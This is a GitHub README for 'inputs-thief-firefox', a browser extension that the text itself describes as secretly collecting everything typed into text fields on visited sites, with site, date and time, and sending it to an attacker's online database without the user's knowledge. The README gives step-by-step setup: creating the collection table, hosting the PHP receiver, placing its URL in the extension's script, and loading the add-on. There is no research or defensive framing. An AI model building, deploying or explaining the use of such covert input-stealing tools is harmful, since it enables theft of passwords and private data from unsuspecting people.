# inputs-thief-firefox

## 1 - Explanations

Inputs thief firefox is an extension working on a firefox web browser, she takes care of retrieving all inputs with type="text", site, time and date. Once harvested, everything is sent to an online database without the user's knowledge.

## 2 - ![demo](https://images.squarespace-cdn.com/content/v1/5638f556e4b0fd14a38bf4c6/1448895329616-L2065BLB3T3NY89P45XW/ke17ZwdGBToddI8pDm48kLi7PWKhIZwR6U0XbfuvpAx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTmS3R1u-H-LFkUZVSRUKY3IlmvI26ZC-62P24WJY7GOquE-R9icnoHS3vbcbkk6gkG/disclaimer.gif?format=10w) Disclaimer 
![demo](https://images.squarespace-cdn.com/content/v1/5638f556e4b0fd14a38bf4c6/1448895329616-L2065BLB3T3NY89P45XW/ke17ZwdGBToddI8pDm48kLi7PWKhIZwR6U0XbfuvpAx7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTmS3R1u-H-LFkUZVSRUKY3IlmvI26ZC-62P24WJY7GOquE-R9icnoHS3vbcbkk6gkG/disclaimer.gif?format=40w)


## 3 - Necessary things

* The firefox web browser
* A SQL database hosted online
* A php script hosted online
(But it can work on a local web server: XAMPP or WAMP)

## 4 - Installation (The schema is as follows)

* Clone the repositorie : https://github.com/p3titcr0c0/inputs-thief-firefox.git

* Create a database, then a table named firefoxExtension, add an id which self-increments as data is entered. Then add four separate identifiers : date, heure, site, inputs

* Modify php-a-heberger.php to connect the php --> your database with PDO

* Heberger php-a-heberger.php online and remember the url

* Enter the url in the call of ajaxPost function, line 57 of script.js.

* Opening the about:debugging page with Firefox

> The about:debugging page provides a single place from which you can attach the Firefox Developer Tools to a number of debugging targets. At the moment it supports three main sorts of targets: restartless add-ons, tabs, and workers.

* load the temporary add-on with :
```bash
manifest.json
```

* Everything works, you will receive the inputs, the date and time and the site on your database.

## 5 - Project development

Finished and functional, 15/06/2020.

## 6 - Screenshots

#  ![demo](./logo.png)
